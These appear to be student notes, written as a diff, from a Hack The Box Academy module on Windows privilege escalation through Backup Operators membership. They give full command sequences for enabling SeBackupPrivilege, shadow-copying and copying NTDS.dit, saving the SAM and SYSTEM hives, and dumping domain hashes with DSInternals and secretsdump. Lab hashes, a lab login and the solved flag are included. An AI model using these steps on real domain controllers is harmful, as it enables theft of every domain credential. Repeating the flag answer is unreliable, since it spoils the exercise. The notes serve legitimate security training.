@@ -1,1 +1,214 @@
 
+As mentioned in the Windows Privileges Overview section, Windows servers, and especially Domain Controllers, have a variety of built-in groups that either ship with the operating system or get added when the Active Directory Domain Services role is installed on a system to promote a server to a Domain Controller. Many of these groups confer special privileges on their members, and some can be leveraged to escalate privileges on a server or a Domain Controller.
+
+
+Backup Operators
+After landing on a machine, we can use the command whoami /groups to show our current group memberships. Let's examine the case where we are a member of the Backup Operators group. Membership of this group grants its members the SeBackup and SeRestore privileges. The SeBackupPrivilege allows us to traverse any folder and list the folder contents. This will let us copy a file from a folder, even if there is no access control entry (ACE) for us in the folder's access control list (ACL). However, we can't do this using the standard copy command. Instead, we need to programmatically copy the data, making sure to specify the FILE_FLAG_BACKUP_SEMANTICS flag.
+
+We can use this PoC (https://github.com/giuliano108/SeBackupPrivilege) to exploit the SeBackupPrivilege, and copy this file. First, let's import the libraries in a PowerShell session.
+
+PS SYNTAX: PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
+PS SYNTAX: PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
+
+can confirm pricvs with 
+
+PS SYNTAX: PS C:\htb> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========
+SeMachineAccountPrivilege     Add workstations to domain     Disabled
+SeBackupPrivilege             Back up files and directories  Disabled
+SeRestorePrivilege            Restore files and directories  Disabled
+SeShutdownPrivilege           Shut down the system           Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+IF DISABLED: 
+
+PS SYNTAX: PS C:\htb> Set-SeBackupPrivilege
+PS SYNTAX: PS C:\htb> Get-SeBackupPrivilege
+
+SeBackupPrivilege is enabled
+
+COPYING PROTECTED FILE: 
+
+PS SYNTAX: PS C:\htb> dir C:\Confidential\
+
+    Directory: C:\Confidential
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         5/6/2021   1:01 PM             88 2021 Contract.txt
+
+
+PS C:\htb> cat 'C:\Confidential\2021 Contract.txt'
+
+cat : Access to the path 'C:\Confidential\2021 Contract.txt' is denied.
+At line:1 char:1
++ cat 'C:\Confidential\2021 Contract.txt'
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (C:\Confidential\2021 Contract.txt:String) [Get-Content], Unauthor
+   izedAccessException
+    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
+
+PS SYNTAX: PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
+
+Copied 88 bytes
+
+
+PS SYNTAX: PS C:\htb>  cat .\Contract.txt
+
+Inlanefreight 2021 Contract
+
+==============================
+
+Board of Directors:
+
+<...SNIP...>
+
+
+Attacking a Domain Controller - Copying NTDS.dit
+This group also permits logging in locally to a domain controller. The active directory database NTDS.dit is a very attractive target, as it contains the NTLM hashes for all user and computer objects in the domain. However, this file is locked and is also not accessible by unprivileged users.
+
+As the NTDS.dit file is locked by default, we can use the Windows diskshadow utility to create a shadow copy of the C drive and expose it as E drive. The NTDS.dit in this shadow copy won't be in use by the system.
+
+PS SYNTAX: PS C:\htb> diskshadow.exe
+
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  DC,  10/14/2020 12:57:52 AM
+
+DISKSHADOW> set verbose on
+DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
+DISKSHADOW> set context clientaccessible
+DISKSHADOW> set context persistent
+DISKSHADOW> begin backup
+DISKSHADOW> add volume C: alias cdrive
+DISKSHADOW> create
+DISKSHADOW> expose %cdrive% E:
+DISKSHADOW> end backup
+DISKSHADOW> exit
+
+PS C:\htb> dir E:
+
+
+    Directory: E:\
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         5/6/2021   1:00 PM                Confidential
+d-----        9/15/2018  12:19 AM                PerfLogs
+d-r---        3/24/2021   6:20 PM                Program Files
+d-----        9/15/2018   2:06 AM                Program Files (x86)
+d-----         5/6/2021   1:05 PM                Tools
+d-r---         5/6/2021  12:51 PM                Users
+d-----        3/24/2021   6:38 PM                Windows
+
+Copying NTDS.dit LOCALLY 
+
+PS SYNTAX: PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
+
+Copied 16777216 bytes
+
+Backing up SAM and SYSTEM Registry Hives
+The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket's secretsdump.py
+
+CMD SYNTAX: C:\htb> reg save HKLM\SYSTEM SYSTEM.SAV
+CMD SYNTAX: C:\htb> reg save HKLM\SAM SAM.SAV
+
+Extracting Credentials from NTDS.dit
+With the NTDS.dit extracted, we can use a tool such as secretsdump.py or the PowerShell DSInternals module to extract all Active Directory account credentials. Let's obtain the NTLM hash for just the administrator account for the domain using DSInternals.
+
+PS SYNTAX: PS C:\htb> Import-Module .\DSInternals.psd1
+PS SYNTAX: PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
+PS SYNTAX: PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
+
+DistinguishedName: CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+Sid: S-1-5-21-669053619-2741956077-1013132368-500
+Guid: f28ab72b-9b16-4b52-9f63-ef4ea96de215
+SamAccountName: Administrator
+SamAccountType: User
+UserPrincipalName:
+PrimaryGroupId: 513
+SidHistory:
+Enabled: True
+UserAccountControl: NormalAccount, PasswordNeverExpires
+AdminCount: True
+Deleted: False
+LastLogonDate: 5/6/2021 5:40:30 PM
+DisplayName:
+GivenName:
+Surname:
+Description: Built-in account for administering the computer/domain
+ServicePrincipalName:
+SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited,
+DiscretionaryAclProtected, SelfRelative
+Owner: S-1-5-21-669053619-2741956077-1013132368-512
+Secrets
+  NTHash: cf3a5525ee9414229e66279623ed5c58
+  LMHash:
+  NTHashHistory:
+  LMHashHistory:
+  SupplementalCredentials:
+    ClearText:
+    NTLMStrongHash: 7790d8406b55c380f98b92bb2fdc63a7
+    Kerberos:
+      Credentials:
+        DES_CBC_MD5
+          Key: d60dfbbf20548938
+      OldCredentials:
+      Salt: WIN-NB4NGP3TKNKAdministrator
+      Flags: 0
+    KerberosNew:
+      Credentials:
+        AES256_CTS_HMAC_SHA1_96
+          Key: 5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
+          Iterations: 4096
+        AES128_CTS_HMAC_SHA1_96
+          Key: 94c300d0e47775b407f2496a5cca1a0a
+          Iterations: 4096
+        DES_CBC_MD5
+          Key: d60dfbbf20548938
+          Iterations: 4096
+      OldCredentials:
+      OlderCredentials:
+      ServiceCredentials:
+      Salt: WIN-NB4NGP3TKNKAdministrator
+      DefaultIterationCount: 4096
+
+
+Extracting Hashes Using SecretsDump
+
+KALI MACHINE SYNTAX: MJBUCKNER@htb[/htb]$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
+
+Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation
+
+[*] Target system bootKey: 0xc0a9116f907bd37afaaa845cb87d0550
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 85541c20c346e3198a3ae2c09df7f330
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WINLPE-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7abf052dcef31f6305f1d4c84dfa7484:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129:::
+htb-student:1103:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
+svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+bob:1105:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+hyperv_adm:1106:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+printsvc:1107:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+
+
+CHALLENGE: RDP to 10.129.43.42 (ACADEMY-WINLPE-DC01) with user "svc_backup" and password "HTB_@cademy_stdnt!" 
+Question 1 -  Leverage SeBackupPrivilege rights and obtain the flag located at c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt - Car3ful_w1th_gr0up_m3mberSh1p! 
+1) xfreerdp in
+2) Powershell admin 
+3) cd C:\Tools
+4) Import-Module .\SeBackupPrivilegeUtils.dll + Import-Module .\SeBackupPrivilegeCmdLets.dll
+5) Set-SeBackupPrivilege + Get-SeBackupPrivilege
+6)Copy-FileSeBackupPrivilege 'C:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt' .\flag.txt
+7) cat .\flag.txt - Car3ful_w1th_gr0up_m3mberSh1p!
